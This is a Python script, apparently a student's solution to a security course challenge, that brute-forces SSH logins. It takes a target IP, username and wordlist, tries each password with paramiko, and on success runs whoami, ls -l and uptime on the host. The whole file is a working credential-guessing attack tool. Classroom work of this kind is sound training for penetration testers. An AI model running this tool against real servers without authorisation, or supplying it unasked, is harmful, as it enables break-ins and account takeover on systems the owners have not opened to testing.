import time
import paramiko
import sys
# Script: Ops 401 Class 17 Ops Challenge Solution
# Author: Connie Uribe Chavez
# Date of latest revision: 09 May 2023
# Purpose: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Purpose: develop a custom tool that performs brute force attacks.
# Reference: Used code from ChatGPT And CodeFellows 401d6 Class Demo class repo
# Authenticate to an SSH server by its IP address.

# GOAL: Assume the username and IP are known inputs and attempt each word on the 
# provided word list until successful login takes place.

# Get input from user
host = input("Please provide an IP address to connect to:")
user = input("Please provide a username:")
filepath = input("Enter your wordlist filepath:\n")
port = 22

# Create object of SSHCLient and connect to SSH
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

file = open(filepath, encoding="ISO-8859-1")
line = file.readline()
while line:
    password = line.strip()
    try:
      ssh.connect(host, port, user, password)
      stdin, stdout, stderr = ssh.exec_command("whoami")
      time.sleep(3)
      output = stdout.read()
      print(output)
      stdin, stdout, stderr = ssh.exec_command("ls -l")
      time.sleep(3)
      output = stdout.read()
      print(output)
      stdin, stdout, stderr = ssh.exec_command("uptime")
      time.sleep(3)
      output = stdout.read()
      print(output)
      print(f"Login successful with password: {password}")
      break # Exit the loop if successful login occurs
    
    except paramiko.AuthenticationException as e:
      print(f"Password: {password}")
      print(e)
    except KeyboardInterrupt:
        print("\n\n[*] User requested an interrupt.")
        sys.exit() # this is Ctrl + C
    line = file.readline()

file.close()
ssh.close()